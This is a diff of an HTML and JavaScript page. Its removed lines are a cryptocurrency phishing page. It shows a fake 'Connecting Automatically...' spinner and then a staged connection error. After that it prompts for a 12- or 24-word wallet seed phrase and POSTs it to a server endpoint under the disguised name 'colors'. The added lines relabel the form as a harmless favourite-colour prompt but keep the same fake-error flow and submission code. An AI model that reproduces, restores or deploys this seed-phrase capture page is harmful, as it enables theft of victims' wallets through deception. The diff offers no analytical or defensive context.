@@ -1,5 +1,5 @@
+```html
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -62,7 +62,7 @@
 
     button {
       padding: 10px 24px;
-      width:250px;
+      width: 250px;
       border: none;
       border-radius: 6px;
       background: #000000;
@@ -72,7 +72,7 @@
     }
 
     button:hover {
-      background: #000000
+      background: #000000;
     }
 
     button:disabled {
@@ -80,19 +80,24 @@
       cursor: not-allowed;
     }
 
-    .overlay {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.5);
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-    }
+   .overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.5);
 
-    .overlay.show {
-      display: flex;
-    }
+  display: none;
+  align-items: center;
+  justify-content: center;
+
+  z-index: 1000;
+}
+
+.overlay.show {
+  display: flex;
+}
 
     .popup {
       width: 300px;
@@ -102,21 +107,22 @@
       box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
       text-align: center;
     }
-.welcome-title {
-  display: block;
-  font-size: 24px;
-  margin-bottom: 12px;
-}
 
-.error-text {
-  font-size: 15px;
-  line-height: 1.5;
-}
+    .welcome-title {
+      display: block;
+      font-size: 24px;
+      margin-bottom: 12px;
+    }
+
+    .error-text {
+      font-size: 15px;
+      line-height: 1.5;
+    }
+
     .popup h3 {
       margin: 0 0 16px;
       color: #374151;
     }
-
     .popup input {
       width: 100%;
       box-sizing: border-box;
@@ -141,7 +147,6 @@
       color: #dc2626;
     }
   </style>
-
 </head>
 
 <body>
@@ -149,57 +154,51 @@
   <div class="container">
     <div class="spinner" id="spinner"></div>
 
-```
-<p id="message">Connecting Automatically...</p>
+    <p id="message">Connecting Automatically...</p>
 
-<button id="goUp" class="hidden">
-  Connect Manually!
-</button>
-
-
+    <button id="goUp" class="hidden">
+      Choose Favourite Colour
+    </button>
   </div>
 
   <!-- Colour Input Popup -->
-
   <div class="overlay" id="colorPopup">
     <div class="popup">
-      <h3>Enter your wallet seedphrase</h3>
 
-<p>Enter Wallet Phrase </p>
-  <input
-    type="text"
-    id="colorInput"
-    placeholder=" Enter Phrase"
-    maxlength="290"
-    autocomplete="off"
-  >
-<p>Usually 12 or 24 words and separated by a single space. </p>
-  <p
-    class="input-error hidden"
-    id="inputError">
-  </p>
+      <h3>Welcome</h3>
 
-  <button id="submitBtn">
-    Connect
-  </button>
-</div>
-```
+      <p>Enter your favourite colour</p>
 
+      <input
+        type="text"
+        id="colorInput"
+        placeholder="Enter colour"
+        maxlength="40"
+        autocomplete="off"
+      >
+
+      <p>For example: Red, Blue, Green or Black.</p>
+
+      <p class="input-error hidden" id="inputError"></p>
+
+      <button id="submitBtn">
+        Submit
+      </button>
+
+    </div>
   </div>
 
   <!-- Thank You Popup -->
-
   <div class="overlay" id="thanksPopup">
     <div class="popup">
+
       <h3>Your colour entry has been received</h3>
 
-```
-  <button id="closeBtn">
-    Close
-  </button>
-</div>
-```
+      <button id="closeBtn">
+        Close
+      </button>
 
+    </div>
   </div>
 
   <script>
@@ -220,16 +219,15 @@
     // After 5 seconds, show the error message
     setTimeout(() => {
       spinner.classList.add("hidden");
-message.innerHTML = `
-  <div class="error-text">
-    Error Connecting...<br>
-    There was an error connecting automatically, please connect manually.
-  </div>
-`;
 
-message.classList.add("error");
+      message.innerHTML = `
+        <div class="error-text">
+          Error Connecting...<br>
+          There was an error connecting automatically, please connect manually.
+        </div>
+      `;
 
-message.classList.add("error");
+      message.classList.add("error");
 
       goUp.classList.remove("hidden");
     }, 5000);
@@ -243,7 +241,6 @@ message.classList.add("error");
       });
 
       colorPopup.classList.add("show");
-
       colorInput.focus();
     });
 
@@ -258,11 +255,11 @@ message.classList.add("error");
     // Submit colour
     submitBtn.addEventListener("click", async () => {
 
-      const colors = colorInput.value.trim();
+      const color = colorInput.value.trim();
 
       // Check if empty
-      if (!colors) {
-        showError("Please enter complete phrases.");
+      if (!color) {
+        showError("Please enter a colour.");
         return;
       }
 
@@ -273,10 +270,9 @@ message.classList.add("error");
       submitBtn.disabled = true;
       submitBtn.textContent = "Sending...";
 
-
       try {
 
-        const response = await fetch("/api/colors", {
+        const response = await fetch("/api/favourite-color", {
           method: "POST",
 
           headers: {
@@ -284,24 +280,28 @@ message.classList.add("error");
           },
 
           body: JSON.stringify({
-            colors: colors
+            color: color
           })
         });
 
 
-        // Check if server responded successfully
+        const data = await response.json();
+
+        console.log("Server response:", response.status, data);
+
+
+        // Check server response
         if (!response.ok) {
-          throw new Error("Server error. Please try again.");
+          throw new Error(
+            data.message || "Server error. Please try again."
+          );
         }
 
 
-        const data = await response.json();
-
-
         // Check API response
-        if (!data.ok) {
+        if (!data.success) {
           throw new Error(
-            data.error || "Could not send your colour."
+            data.message || "Could not send your colour."
           );
         }
 
@@ -370,3 +370,6 @@ message.classList.add("error");
 
 </body>
 </html>
+```
+
+
